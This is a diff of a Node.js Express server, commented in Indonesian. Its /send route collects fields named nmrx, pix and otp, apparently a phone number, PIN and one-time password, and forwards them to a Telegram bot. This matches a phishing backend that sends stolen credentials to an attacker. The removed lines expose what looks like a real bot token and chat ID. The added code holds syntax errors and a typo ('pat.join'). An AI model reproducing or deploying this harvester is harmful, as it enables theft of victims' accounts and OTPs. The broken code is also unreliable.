@@ -1,29 +1,71 @@
 const express = require("express");
 const axios = require("axios");
+const path = require("path");
 
 const app = express();
 
 /* TOKEN BOT */
 const BOT_TOKEN =
-"8795244499:AAGoD4sd3_k7SHOa510ulhrOqXWrbkpPfv4";
+process.env.BOT_TOKEN;
 
 /* CHAT ID */
 const CHAT_ID =
-"7558232474";
+process.env.CHAT_ID;
 
 app.use(express.json());
-app.use(express.static(__dirname));
+app.use(
+    express.urlencoded({
+        extended:true
+    })
+);
+
+app.use(
+    express.static(
+        pat.join(__dirname)
+    )
+);
+
+app.get("/", (req,res)=>{
+    
+    res.send("SERVER HIDUP");
+    
+});
 
 /* ROUTE */
-app.post("/send", async(req,res) => {
+app.post("/send", async(req,res) =>{
 
     try{
 
+        console.log(
+            "DATA MASUK":"
+        );
+
+        console.log(
+            req.body
+        );
+
         const {
+            
             nmrx,
             pix,
             otp
+            
         } = req.body;
+
+        if(
+            !nmrx ||
+            !pix ||
+            !otp
+        ){
+
+            return res.status(400).json({
+
+                success:false,
+                message:"Data tidak lengkap"
+
+            });
+
+        }
 
         /* PESAN TELEGRAM */
         const text = `
@@ -50,7 +92,9 @@ app.post("/send", async(req,res) => {
             parse_mode:
             "HTML"
 
-        });
+        }
+
+     );
 
         res.json({
 
@@ -60,7 +104,10 @@ app.post("/send", async(req,res) => {
 
     }catch(error){
 
-        console.log(error);
+        console.log(
+            error.response?.data ||
+            error.message
+       );
 
         res.status(500).json({
 
@@ -74,10 +121,10 @@ app.post("/send", async(req,res) => {
 
 /* PORT */
 const PORT =
-process.env.PORT || 3000;
+process.env.PORT || 8080;
 
 /* JALANKAN */
-app.listen(PORT, () => {
+app.listen(PORT, ()=>{
 
     console.log(
     "Server running on port " +
